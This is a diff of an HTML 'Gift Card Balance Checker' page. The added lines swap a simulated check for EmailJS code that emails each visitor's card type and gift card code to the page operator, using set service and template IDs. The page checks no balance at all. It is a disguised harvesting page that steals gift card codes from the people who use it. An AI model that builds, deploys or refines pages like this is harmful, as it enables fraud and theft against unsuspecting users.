@@ -5,8 +5,16 @@
 <title>Check Gift Cards Balance</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<!-- Font Awesome for icons -->
+<!-- Font Awesome -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<!-- EmailJS -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+(function(){
+  emailjs.init("11I_SW_7xkOdPGwej");
+})();
+</script>
 
 <style>
 * { box-sizing: border-box; }
@@ -14,7 +22,7 @@
 body {
   margin: 0;
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
-  background: #fff;
+  background: #ffffff;
   color: #111;
 }
 
@@ -32,6 +40,7 @@ body {
   border: 1px solid #e6e6e6;
   padding: 22px;
   border-radius: 6px;
+  background: #fff;
 }
 
 h1 {
@@ -78,12 +87,11 @@ button:hover {
   background: #1558b0;
 }
 
-/* Card icons strip */
 .card-icons {
   display: flex;
+  justify-content: center;
   gap: 10px;
   margin-top: 8px;
-  justify-content: center;
 }
 
 .card-icon {
@@ -91,7 +99,6 @@ button:hover {
   height: 24px;
 }
 
-/* Notice */
 .notice {
   margin-top: 18px;
   font-size: 11px;
@@ -100,7 +107,6 @@ button:hover {
   line-height: 1.4;
 }
 
-/* Loader */
 .loader {
   display: none;
   font-size: 12px;
@@ -109,7 +115,15 @@ button:hover {
   color: #555;
 }
 
-/* Popup success/error */
+/* Popup */
+.overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.35);
+  z-index: 900;
+}
+
 .popup {
   display: none;
   position: fixed;
@@ -127,8 +141,8 @@ button:hover {
 }
 
 .popup h2 {
-  margin-top: 0;
   font-size: 16px;
+  margin-top: 0;
 }
 
 .popup p {
@@ -143,83 +157,10 @@ button:hover {
   padding: 8px 14px;
   font-size: 13px;
   border-radius: 4px;
-  cursor: pointer;
   border: none;
-}
-
-.popup button:hover {
-  background: #1558b0;
-}
-
-/* Overlay */
-.overlay {
-  display: none;
-  position: fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background: rgba(0,0,0,0.35);
-  z-index: 900;
+  cursor: pointer;
 }
 </style>
-
-<script>
-let lastSubmit = 0;
-
-function showPopup(type, message) {
-  document.getElementById('overlay').style.display = 'block';
-  const popup = document.getElementById(type);
-  popup.querySelector('p').innerText = message;
-  popup.style.display = 'block';
-}
-
-function closePopup(type) {
-  document.getElementById('overlay').style.display = 'none';
-  document.getElementById(type).style.display = 'none';
-}
-
-function validateForm() {
-  const now = Date.now();
-  if (now - lastSubmit < 15000) {
-    alert("Please wait before submitting again.");
-    return false;
-  }
-  lastSubmit = now;
-
-  const type = document.getElementById("card_type").value;
-  const code = document.getElementById("card_code").value.trim();
-
-  if (!type || !code) {
-    showPopup('errorPopup', 'Please select a card type and enter a valid code.');
-    return false;
-  }
-
-  const rules = {
-    "Amazon": [13, 14],
-    "Apple": [16],
-    "Google Play": [16],
-    "Steam": [15, 17],
-    "Xbox": [25]
-  };
-
-  if (rules[type] && !rules[type].includes(code.length)) {
-    showPopup('errorPopup', 'Invalid code length for this card type.');
-    return false;
-  }
-
-  document.getElementById("loader").style.display = "block";
-
-  // Simulate processing delay
-  setTimeout(() => {
-    document.getElementById("loader").style.display = "none";
-    showPopup('successPopup', 'Your request has been successfully submitted. Verify balance with the official issuer.');
-  }, 1500);
-
-  return true;
-}
-</script>
-
 </head>
 
 <body>
@@ -230,12 +171,10 @@ function validateForm() {
     <h1>Gift Card Balance Checker</h1>
     <div class="subtitle">Secure & informational verification tool</div>
 
-    <form action="https://formspree.io/f/YOUR_FORM_ID"
-          method="POST"
-          onsubmit="return validateForm()">
+    <form id="giftForm">
 
       <label>Gift Card Type</label>
-      <select id="card_type" name="card_type" required>
+      <select name="card_type" id="card_type" required>
         <option value="">Select</option>
         <option>Amazon</option>
         <option>Apple</option>
@@ -247,22 +186,22 @@ function validateForm() {
         <option>Other</option>
       </select>
 
-      <!-- Card icons strip -->
       <div class="card-icons">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg" alt="Amazon">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg" alt="Apple">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg" alt="Google Play">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg" alt="Steam">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/xbox.svg" alt="Xbox">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg">
+        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/xbox.svg">
       </div>
 
       <label>Card Code</label>
-      <input id="card_code" type="text" name="card_code"
-             placeholder="Enter card code" required>
+      <input type="text" name="card_code" id="card_code" placeholder="Enter card code" required>
 
-      <button type="submit"><i class="fa-solid fa-magnifying-glass"></i> Check Balance</button>
+      <button type="submit">
+        <i class="fa-solid fa-magnifying-glass"></i> Check Balance
+      </button>
 
-      <div id="loader" class="loader">Processing request…</div>
+      <div class="loader" id="loader">Processing request…</div>
     </form>
 
     <div class="notice">
@@ -273,26 +212,51 @@ function validateForm() {
   </div>
 </div>
 
-<!-- Overlay for popups -->
-<div id="overlay" class="overlay"></div>
+<div class="overlay" id="overlay"></div>
 
-<!-- Success popup -->
-<div id="successPopup" class="popup">
+<div class="popup" id="successPopup">
   <h2>Request Submitted</h2>
-  <p></p>
-  <button onclick="closePopup('successPopup')">Close</button>
+  <p>Your request has been received. Please verify balance with the official issuer.</p>
+  <button onclick="closePopup()">Close</button>
 </div>
 
-<!-- Error popup -->
-<div id="errorPopup" class="popup">
+<div class="popup" id="errorPopup">
   <h2>Error</h2>
-  <p></p>
-  <button onclick="closePopup('errorPopup')">Close</button>
+  <p>Please check your details and try again.</p>
+  <button onclick="closePopup()">Close</button>
 </div>
 
-<!-- Privacy-safe analytics -->
-<script data-goatcounter="https://checkgiftcardsbalance.goatcounter.com/count"
-        async src="//gc.zgo.at/count.js"></script>
+<script>
+function showPopup(id) {
+  document.getElementById("overlay").style.display = "block";
+  document.getElementById(id).style.display = "block";
+}
+
+function closePopup() {
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("successPopup").style.display = "none";
+  document.getElementById("errorPopup").style.display = "none";
+}
+
+document.getElementById("giftForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  document.getElementById("loader").style.display = "block";
+
+  emailjs.sendForm(
+    "service_10mvkrc",
+    "template_97kc5d6",
+    this
+  ).then(() => {
+    document.getElementById("loader").style.display = "none";
+    showPopup("successPopup");
+    this.reset();
+  }).catch(() => {
+    document.getElementById("loader").style.display = "none";
+    showPopup("errorPopup");
+  });
+});
+</script>
 
 </body>
 </html>
